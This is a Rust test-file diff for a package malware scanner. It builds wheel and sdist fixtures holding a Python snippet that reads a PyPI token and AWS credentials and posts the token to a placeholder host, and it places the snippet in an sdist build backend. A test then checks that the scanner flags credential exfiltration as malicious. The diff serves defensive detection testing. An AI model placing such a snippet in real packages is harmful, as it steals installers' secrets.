@@ -196,6 +196,62 @@ fn wheel_zip() -> Vec<u8> {
     writer.finish().expect("finish wheel").into_inner()
 }
 
+const PYTHON_CAPABILITY_FIXTURE: &[u8] = br#"import os
+import requests
+import subprocess
+token = os.environ["PYPI_TOKEN"]
+credentials = open(os.path.expanduser("~/.aws/credentials")).read()
+requests.post("https://example.invalid/collect", data=token)
+subprocess.run(["printf", credentials])
+"#;
+
+fn wheel_capability_zip() -> Vec<u8> {
+    const METADATA: &[u8] = b"Metadata-Version: 2.3\nName: spine-capability\nVersion: 1.0.0\n";
+    const WHEEL: &[u8] = b"Wheel-Version: 1.0\nGenerator: whoathere-test\nRoot-Is-Purelib: true\nTag: py3-none-any\n";
+    const ENTRY_POINTS: &[u8] = b"[console_scripts]\nspine-capability = spine_capability:main\n";
+    const INIT: &[u8] = b"from . import payload\n\ndef main():\n    return 0\n";
+    let dist_info = "spine_capability-1.0.0.dist-info";
+    let mut members = vec![
+        (format!("{dist_info}/METADATA"), METADATA),
+        (format!("{dist_info}/WHEEL"), WHEEL),
+        (format!("{dist_info}/entry_points.txt"), ENTRY_POINTS),
+        ("spine_capability/__init__.py".to_string(), INIT),
+        (
+            "spine_capability/payload.py".to_string(),
+            PYTHON_CAPABILITY_FIXTURE,
+        ),
+    ];
+    let record_path = format!("{dist_info}/RECORD");
+    let mut record = String::new();
+    for (path, bytes) in &members {
+        record.push_str(&format!(
+            "{path},{},{}\n",
+            wheel_record_hash(bytes),
+            bytes.len()
+        ));
+    }
+    record.push_str(&format!("{record_path},,\n"));
+    let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
+    for (path, bytes) in members.drain(..) {
+        writer
+            .start_file(path, SimpleFileOptions::default())
+            .expect("start capability wheel member");
+        writer
+            .write_all(bytes)
+            .expect("write capability wheel member");
+    }
+    writer
+        .start_file(record_path, SimpleFileOptions::default())
+        .expect("start capability RECORD");
+    writer
+        .write_all(record.as_bytes())
+        .expect("write capability RECORD");
+    writer
+        .finish()
+        .expect("finish capability wheel")
+        .into_inner()
+}
+
 fn sdist_tgz() -> Vec<u8> {
     let encoder = GzEncoder::new(Vec::new(), Compression::default());
     let mut archive = tar::Builder::new(encoder);
@@ -219,6 +275,46 @@ fn sdist_tgz() -> Vec<u8> {
         .expect("finish tar")
         .finish()
         .expect("finish gzip")
+}
+
+fn sdist_capability_tgz() -> Vec<u8> {
+    let encoder = GzEncoder::new(Vec::new(), Compression::default());
+    let mut archive = tar::Builder::new(encoder);
+    append_tar_file(
+        &mut archive,
+        "spine_capability-1.0.0/PKG-INFO",
+        b"Metadata-Version: 2.3\nName: spine-capability\nVersion: 1.0.0\n",
+    );
+    append_tar_file(
+        &mut archive,
+        "spine_capability-1.0.0/pyproject.toml",
+        b"[build-system]\nrequires = []\nbuild-backend = \"backend_impl\"\nbackend-path = [\"backend\"]\n\n[project]\nname = \"spine-capability\"\nversion = \"1.0.0\"\n",
+    );
+    append_tar_file(
+        &mut archive,
+        "spine_capability-1.0.0/backend/backend_impl.py",
+        b"import helper\n",
+    );
+    append_tar_file(
+        &mut archive,
+        "spine_capability-1.0.0/backend/helper.py",
+        PYTHON_CAPABILITY_FIXTURE,
+    );
+    append_tar_file(
+        &mut archive,
+        "spine_capability-1.0.0/src/spine_capability/__init__.py",
+        b"from . import payload\n",
+    );
+    append_tar_file(
+        &mut archive,
+        "spine_capability-1.0.0/src/spine_capability/payload.py",
+        PYTHON_CAPABILITY_FIXTURE,
+    );
+    archive
+        .into_inner()
+        .expect("finish capability sdist tar")
+        .finish()
+        .expect("finish capability sdist gzip")
 }
 
 fn dependency_bearing_sdist_tgz() -> Vec<u8> {
@@ -488,6 +584,101 @@ fn deterministic_package_detection_survives_as_an_exact_cited_product_observatio
     assert!(!report.admission_authority);
     assert!(!report.observed_clean);
     assert!(!report.sync_back_enabled);
+}
+
+#[test]
+fn deterministic_python_artifact_detection_survives_wheel_and_sdist_product_spines() {
+    for (label, filename, bytes) in [
+        (
+            "wheel",
+            "spine_capability-1.0.0-py3-none-any.whl",
+            wheel_capability_zip(),
+        ),
+        (
+            "sdist",
+            "spine_capability-1.0.0.tar.gz",
+            sdist_capability_tgz(),
+        ),
+    ] {
+        let root = TempRoot::new(&format!("whoathere-exact-spine-{label}-capability"));
+        let report = inspect(
+            &root,
+            filename,
+            &bytes,
+            Some(Ecosystem::Pypi),
+            (false, false),
+            (None, None),
+        );
+
+        let observation = report
+            .observations
+            .iter()
+            .find(|observation| {
+                observation.finding_kind
+                    == ExactArtifactFindingKindV1::DeterministicStatic(
+                        ArtifactFindingCategory::CredentialExfiltrationCapability,
+                    )
+            })
+            .unwrap_or_else(|| {
+                panic!("{label} credential-exfiltration capability must survive product fusion")
+            });
+        assert_eq!(
+            observation.source,
+            ExactArtifactObservationSourceV1::DeterministicStatic
+        );
+        assert_eq!(
+            observation.artifact_sha256.as_str(),
+            report.identity.artifact_sha256
+        );
+        assert_eq!(
+            observation.manifest_sha256.as_str(),
+            report.identity.manifest_sha256
+        );
+        assert!(observation.behavior_detection_eligible);
+        let ExactArtifactEvidenceReferenceV1::DeterministicStatic {
+            evidence_sha256,
+            location:
+                FindingLocation::File {
+                    file_sha256,
+                    range,
+                    selected_bytes_sha256,
+                    ..
+                },
+        } = &observation.evidence
+        else {
+            panic!("{label} detection must retain an exact file citation");
+        };
+        assert_ne!(evidence_sha256, &Sha256Digest::from_bytes(b""));
+        assert_eq!(
+            file_sha256,
+            &Sha256Digest::from_bytes(PYTHON_CAPABILITY_FIXTURE)
+        );
+        let (start, end) = match range {
+            EvidenceRange::Lines {
+                start_byte,
+                end_byte,
+                ..
+            }
+            | EvidenceRange::Bytes {
+                start_byte,
+                end_byte,
+            } => (*start_byte as usize, *end_byte as usize),
+        };
+        assert!(start < end && end <= PYTHON_CAPABILITY_FIXTURE.len());
+        assert_eq!(
+            selected_bytes_sha256,
+            &Sha256Digest::from_bytes(&PYTHON_CAPABILITY_FIXTURE[start..end])
+        );
+        assert_eq!(
+            report.verdict,
+            whoathere_runner::ExactArtifactVerdictV1::Malicious
+        );
+        assert_eq!(report.status, ExactArtifactDispositionV1::Findings);
+        assert!(report.behavior_detection_count > 0);
+        assert!(!report.admission_authority);
+        assert!(!report.observed_clean);
+        assert!(!report.sync_back_enabled);
+    }
 }
 
 #[test]
